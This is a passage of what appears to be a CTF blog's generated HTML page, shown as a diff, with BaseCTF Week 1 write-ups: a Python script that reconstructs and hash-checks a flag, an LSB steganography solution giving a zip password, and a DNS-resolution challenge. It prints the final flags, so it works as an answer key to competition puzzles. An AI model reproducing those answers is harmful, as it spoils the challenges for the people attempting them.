+<span class="built_in">print</span>(<span class="string">&#x27;Step2:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step3</span>
+flag[<span class="number">10</span>:<span class="number">12</span>] = <span class="built_in">list</span>(<span class="string">&#x27;Mp&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step3:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step4</span>
+flag[-<span class="number">3</span>:] = <span class="built_in">list</span>(<span class="string">&#x27;3x&#125;&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step4:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step5</span>
+flag[-<span class="number">1</span>] = <span class="string">&#x27;&#125;&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step5:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step6-7</span>
+flag[<span class="number">14</span>]=<span class="string">&#x27;_&#x27;</span>
+flag[<span class="number">17</span>]=<span class="string">&#x27;_&#x27;</span>
+flag[<span class="number">24</span>]=<span class="string">&#x27;_&#x27;</span>
+flag[<span class="number">29</span>]=<span class="string">&#x27;_&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step6&amp;7:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step8</span>
+flag[<span class="number">12</span>] = <span class="string">&#x27;l&#x27;</span>
+flag[<span class="number">16</span>] = <span class="string">&#x27;s&#x27;</span>
+flag[<span class="number">20</span>] = <span class="string">&#x27;T&#x27;</span>
+flag[<span class="number">24</span>] = <span class="string">&#x27;_&#x27;</span>
+flag[<span class="number">28</span>] = <span class="string">&#x27;n&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step8:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step9全大写，可省略</span>
+<span class="comment">#Step10</span>
+<span class="comment">#flag[-11]是数字，且其五次方为 1024（即 &#x27;4&#x27;）</span>
+flag[-<span class="number">11</span>] = <span class="string">&#x27;4&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step10:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step11</span>
+<span class="comment">#&#x27;MG1QbA==&#x27;</span>
+flag[-<span class="number">7</span>:-<span class="number">3</span>] = <span class="built_in">list</span>(<span class="string">&#x27;0mPl&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step11:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step12</span>
+<span class="comment">#7d4372733173</span>
+flag[-<span class="number">1</span>::-<span class="number">7</span>] = <span class="built_in">list</span>(<span class="string">&#x27;&#125;Crs1s&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step12:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step13</span>
+flag[<span class="number">23</span>] = <span class="string">&#x27;r&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step13:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step14</span>
+<span class="comment">#flag[21:27].encode() == [116, 51, 114, 95, 84, 104]</span>
+flag[<span class="number">21</span>:<span class="number">27</span>] = <span class="built_in">list</span>(<span class="string">&#x27;t3r_Th&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step14:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step15</span>
+<span class="comment">#乘法校验求和（待定</span>
+flag[<span class="number">17</span>:<span class="number">20</span>] = <span class="built_in">list</span>(<span class="string">&#x27;_Be&#x27;</span>)
+<span class="built_in">print</span>(<span class="string">&#x27;Step15:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step16</span>
+flag[<span class="number">8</span>] = <span class="string">&#x27;s&#x27;</span>
+flag[<span class="number">13</span>] = <span class="string">&#x27;3&#x27;</span>
+flag[<span class="number">15</span>] = <span class="string">&#x27;1&#x27;</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step16:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+flag_str = <span class="string">&#x27;&#x27;</span>.join(flag)
+<span class="built_in">print</span>(<span class="string">&#x27;Final flag:&#x27;</span>, flag_str)
+<span class="keyword">if</span> hashlib.sha1(flag_str.encode()).hexdigest() == <span class="string">&#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span>:
+    <span class="built_in">print</span>(<span class="string">&#x27;🎉 生成的 flag 为:&#x27;</span>, flag_str)
+<span class="keyword">else</span>:
+    <span class="built_in">print</span>(<span class="string">&#x27;❌ 生成的 flag 未通过校验&#x27;</span>)
+
+<span class="comment">#BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;</span></code></pre>
+
+<h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><p>有一张图片，先LSB一下</p>
+<pre><code class="highlight python">extradata:<span class="number">0</span> .. text: <span class="string">&quot;RE9fWU9VX0tOT1dfRVpfTFNCPw==&quot;</span>
+b1,rgb,lsb,xy .. text: <span class="string">&quot;key=lud1_lud1&quot;</span></code></pre>
+
+<p>解压后调到文本文件的最下面，最上面的是假flag</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164729.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164729.png" srcset="./img/load.gif" alt="image">​</p>
+<h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><p>很明显域名解析的用法，上一次还是运维赛的时候，hhhh</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164731.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164731.png" srcset="./img/load.gif" alt="image">​</p>
+<p>‍</p>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>updated at 2024-09-16</p></div> 
+    <div class="post-entry__tags"></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/post/2024-peak-geekmisc-1o9v4u.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            2024巅峰极客-Misc
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/post/the-beginning-of-everything-ogta7.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            一切的初始~~~
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+    
+        <span id="leancloud_container_site_uv" hidden>
+            <span></span>
+            <span id="leancloud_value_site_uv"></span>
+            <span>Viewers</span>
+            
+                <span>&amp;nbsp;&amp;nbsp;&amp;nbsp;|</span>
+            
+        </span>
+    
+    
+        <span id="leancloud_container_site_pv" hidden>
+            <span></span>
+            <span id="leancloud_value_site_pv"></span>
+            <span>Views</span>
+            
+        </span>
+    
+
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2024&nbsp;-&nbsp;2024 <a href="/">Wh1teJ0kerのCTF日记</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+        
+    <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+    <script>
+        window.lazyLoadOptions = {
+            elements_selector: ".lazy",
+            threshold: 0
+        };
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+    <script>
+        (function () {
+            function getRecord(Counter, target) {
+                return new Promise(function (resolve, reject) {
+                    Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+                        .then(response => response.json())
+                        .then(({results}) => {
+                            if (results && results.length > 0) {
+                                var record = results[0];
+                                resolve(record);
+                            } else {
+                                Counter('post', '/classes/Counter', {
+                                        target, time: 0
+                                    })
+                                    .then(response => response.json())
+                                    .then(record => {
+                                        resolve(record);
+                                    }).catch(error => {
+                                        console.error('Failed to create', error);
+                                        reject(error);
+                                    });
+                            }
+                        }).catch(error => {
+                            console.error('LeanCloud Counter Error', error);
+                            reject(error);
+                        });
+                })
+            }
+        
+            function buildIncrement(objectId) {
+                return {
+                    "method": "PUT",
+                    "path": `/1.1/classes/Counter/${ objectId }`,
+                    "body": {
+                        "time": {
+                            '__op': 'Increment',
+                            'amount': 1
+                        }
+                    }
+                }
+            }
+        
+            function increment(Counter, incrArr) {
+                return new Promise(function (resolve, reject) {
+                    Counter('post', '/batch', {
+                        "requests": incrArr
+                    }).then((res) => {
+                        resolve(res);
+                    }).catch(error => {
+                        console.error('Failed to save visitor count', error);
+                        reject(error);
+                    });
+                });
+            }
+        
+            function validUV() {
+                var key = 'LeanCloud_UV_Flag';
+                var flag = localStorage.getItem(key);
+                if (flag) {
+                    if (new Date().getTime() - parseInt(flag) <= 86400000) {
+                        return false;
+                    }
+                }
+                localStorage.setItem(key, new Date().getTime().toString());
+                return true;
+            }
+        
+            function addCount(Counter) {
+                var enableIncr = 'leancloud' === 'leancloud';
+                var getterArr = [];
+                var incrArr = [];
+                var pvCtn = document.querySelector('#leancloud_container_site_pv');
+                if (pvCtn || enableIncr) {
+                    var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+                        incrArr.push(buildIncrement(record.objectId))
+                        var ele = document.querySelector('#leancloud_value_site_pv');
+                        if (ele) {
+                            ele.innerText = record.time + 1;
+                            if (pvCtn) {
+                                pvCtn.style.display = 'inline';
+                            }
+                        }
+                    });
+                    getterArr.push(pvGetter);
+                }
+                var uvCtn = document.querySelector('#leancloud_container_site_uv');
+                if (uvCtn || enableIncr) {
+                    var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+                        var vuv = validUV();
+                        vuv && incrArr.push(buildIncrement(record.objectId))
+                        var ele = document.querySelector('#leancloud_value_site_uv');
+                        if (ele) {
+                            ele.innerText = record.time + (vuv ? 1 : 0);
+                            if (uvCtn) {
+                                uvCtn.style.display = 'inline';
+                            }
+                        }
+                    });
+                    getterArr.push(uvGetter);
+                }
+                if ('true' === 'true') {
+                    var viewCtn = document.querySelector('#leancloud_container_page_pv');
+                    if (viewCtn || enableIncr) {
+                        var target = decodeURI('/post/2024basectfweek1-und65.html');
+                        var viewGetter = getRecord(Counter, target).then((record) => {
+                            incrArr.push(buildIncrement(record.objectId))
+                            if (viewCtn) {
+                                var ele = document.querySelector('#leancloud_value_page_pv');
+                                if (ele) {
+                                    ele.innerText = (record.time || 0) + 1;
+                                    viewCtn.style.display = 'inline';
+                                }
+                            }
+                        });
+                        getterArr.push(viewGetter);
+                    }
+                }
+                if (enableIncr) {
+                    Promise.all(getterArr).then(() => {
+                        incrArr.length > 0 && increment(Counter, incrArr);
+                    })
+                }
+            }
+        
+            var app_id = 'vX1ueWRsZOzivgPodwOrN3Ar-gzGzoHsz';
+            var app_key = 'KcrLQh8tdhzsVRby2L7bi6lp';
+            var server_url = 'https://vx1uewrs.lc-cn-n1-shared.com';
+        
+            function fetchData(api_server) {
+                var Counter = (method, url, data) => {
+                    return fetch(`${ api_server }/1.1${ url }`, {
+                        method,
+                        headers: {
+                                'X-LC-Id': app_id,
+                                'X-LC-Key': app_key,
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data)
+                    });
+                };
+                addCount(Counter);
+            }
+            var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+            if (api_server) {
+                fetchData(api_server);
+            } else {
+                fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+                    .then(response => response.json())
+                    .then(({api_server}) => {
+                        fetchData('https://' + api_server);
+                    });
+            }
+        })();
+    </script>
+
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('true'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"vX1ueWRsZOzivgPodwOrN3Ar-gzGzoHsz","appKey":"KcrLQh8tdhzsVRby2L7bi6lp","placeholder":null,"path":null,"avatar":null,"meta":["nick","mail","link"],"pageSize":null,"lang":true,"visitor":true,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":true,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
